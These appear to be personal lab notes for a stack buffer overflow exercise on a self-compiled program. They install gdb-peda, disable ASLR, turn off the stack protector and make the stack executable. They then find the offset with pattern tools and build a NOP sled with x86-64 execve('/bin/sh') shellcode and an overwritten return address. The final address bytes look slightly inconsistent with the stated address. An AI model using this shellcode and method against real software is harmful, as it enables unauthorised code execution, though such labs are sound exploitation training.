Install gdb-peda:
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"

Check virtual address randomization and randomize it:
cat /proc/sys/kernel/randomize_va_space
sudo sysctl -w kernel.randomize_va_space=0

Compilation with disabled stack guard and stack shield
gcc -o stackOverflow stackOverflow.c -fno-stack-protector -z execstack 

open gdb
gdb stackOverflow

Check normal operation
run $(python3 -c 'print("a"*256)')

Overflow
run $(python3 -c 'print("a"*550)')

Find offset for overflowing the stack pointer:
pattern_create 550 pattern
run $(cat pattern)
pattern_search

A bit of python3 inconsistency:
codecs.encode(b'', 'hex')

Create appropiate input so that the SP is overwritten:
run $(python3 -c $'import codecs\nprint(codecs.encode(b"\x90"*450 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"\x41"*43 + b"b"*6, 'hex')')

Examine memory:
x/200x

Find the address of one of the NOP codes:
Found address: 0x7fffffffdbf8
b = "\xf8\xdb\xff\xff\xff\xf7"
run $(python3 -c 'print("\x90"*450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*43 + "\xf8\xdb\xff\xff\xff\xf7")')